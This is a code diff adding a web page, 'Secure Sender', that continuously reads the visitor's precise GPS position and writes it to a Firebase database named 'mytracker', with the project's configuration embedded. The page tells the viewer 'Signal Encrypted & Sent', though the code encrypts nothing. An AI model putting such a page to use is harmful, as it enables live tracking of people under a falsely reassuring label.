@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Sender</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .radar { width: 150px; height: 150px; border: 2px solid #0f0; border-radius: 50%; position: relative; overflow: hidden; margin-bottom: 20px; }
+        .radar:after { content: ""; position: absolute; width: 100%; height: 100%; background: linear-gradient(90deg, transparent 50%, rgba(0,255,0,0.2) 100%); animation: scan 2s linear infinite; }
+        @keyframes scan { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .status { font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; }
+    </style>
+</head>
+<body>
+    <div class="radar"></div>
+    <div class="status" id="stat">Initializing...</div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBJbxJhyYneksMRNylHbp-JKQqF4uVpaxc",
+            authDomain: "mytracker-31c39.firebaseapp.com",
+            projectId: "mytracker-31c39",
+            storageBucket: "mytracker-31c39.firebasestorage.app",
+            messagingSenderId: "252427552060",
+            appId: "1:252427552060:web:bd411bae4eb8db92704a39",
+            measurementId: "G-610SXC3K9R",
+            databaseURL: "https://mytracker-31c39-default-rtdb.firebaseio.com"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database().ref("live_data");
+
+        navigator.geolocation.watchPosition(pos => {
+            db.set({ lat: pos.coords.latitude, lng: pos.coords.longitude, time: Date.now() });
+            document.getElementById("stat").innerText = "Signal Encrypted & Sent";
+        }, err => { document.getElementById("stat").innerText = "GPS Error"; }, { enableHighAccuracy: true });
+    </script>
+</body>
+</html>
+  
